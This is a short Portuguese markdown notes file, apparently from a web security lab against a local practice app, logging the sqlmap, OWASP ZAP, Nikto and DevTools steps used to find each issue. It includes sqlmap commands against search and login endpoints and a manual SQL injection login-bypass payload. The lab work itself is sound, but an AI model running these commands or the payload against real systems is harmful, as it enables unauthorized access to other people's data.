# Scripts e comandos de exploração

Registre aqui os comandos usados, para que cada achado seja **reprodutível**.

## SQL Injection (A03) — sqlmap

```bash
# Exemplo do roteiro (busca de produtos)
sqlmap -u "http://127.0.0.1:3000/rest/products/search?q=1" --batch

# Login (POST) — capturar a requisição no DevTools/Burp e salvar em req.txt
sqlmap -r req.txt --batch
```

Payload manual de bypass de login (campo e-mail):

```
' OR 1=1--
```

## OWASP ZAP

1. Configure o ZAP como proxy e o navegador apontando pra ele.
2. Rode **Spider** contra `http://127.0.0.1:3000`.
3. Rode **Active Scan** (somente contra o alvo local).
4. Exporte o relatório de alertas para `../evidencias/`.

## Nikto (A05 — misconfiguration)

```bash
nikto -h http://127.0.0.1:3000
```

## Inspeção manual (DevTools)

- Aba **Network**: cabeçalhos de resposta, `Set-Cookie` (flags Secure/HttpOnly), tokens.
- Aba **Console/Application**: cookies, localStorage, JWT.
